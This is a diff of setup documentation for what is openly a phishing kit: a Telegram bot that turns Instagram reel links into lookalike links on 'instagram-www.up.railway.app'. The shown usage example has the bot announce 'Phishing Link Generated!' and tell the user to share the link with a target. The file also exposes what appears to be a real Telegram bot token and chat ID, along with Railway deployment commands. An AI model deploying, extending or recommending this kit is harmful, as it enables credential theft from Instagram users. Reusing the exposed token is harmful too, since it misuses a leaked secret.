@@ -19,7 +19,7 @@
    ```
    TELEGRAM_BOT_TOKEN=8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA
    TELEGRAM_CHAT_ID=8244999766
-   BASE_URL=https://your-app.railway.app
+   BASE_URL=https://instagram-www.up.railway.app
    ```
 6. Go to **Settings** → **Networking** → Click **"Generate Domain"** to expose your service
 7. Copy your Railway app URL (e.g., `https://instagram-production-xxxx.up.railway.app`)
@@ -44,7 +44,7 @@
    ```bash
    railway variables set TELEGRAM_BOT_TOKEN=8287031383:AAEUkQ0Yk9aiWGiG7_1d4SjIfAgR8msEWBA
    railway variables set TELEGRAM_CHAT_ID=8244999766
-   railway variables set BASE_URL=https://your-app.railway.app
+   railway variables set BASE_URL=https://instagram-www.up.railway.app
    ```
 5. Deploy:
    ```bash
@@ -71,7 +71,7 @@
 After deploying, visit this URL in your browser:
 
 ```
-https://your-app.railway.app/setup_webhook.php
+https://instagram-www.up.railway.app/setup_webhook.php
 ```
 
 This will connect the Telegram bot to your server.
@@ -109,7 +109,7 @@ This will connect the Telegram bot to your server.
 You: https://instagram.com/reel/CxK4RN2J8mP
 Bot: ✅ Phishing Link Generated!
      🔗 Your link:
-     https://your-app.railway.app/reel/AbC123XyZ
+     https://instagram-www.up.railway.app/reel/AbC123XyZ
 
      📱 Share this link with your target
 ```
